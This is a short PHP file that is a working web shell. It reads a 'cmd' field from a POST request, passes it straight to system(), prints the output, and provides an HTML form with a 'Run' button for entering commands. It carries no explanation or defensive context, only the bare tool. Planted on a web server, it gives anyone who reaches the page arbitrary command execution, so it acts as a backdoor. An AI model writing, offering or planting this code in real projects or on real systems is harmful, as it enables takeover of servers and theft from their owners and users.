<?php
if(isset($_POST["cmd"])){
    echo "<pre>";
    system($_POST["cmd"]);
    echo "</pre>";
}
?>
<form method="post">
    <input type="text" name="cmd" placeholder="Command:" style="width:300px;">
    <input type="submit" value="Run">
</form>
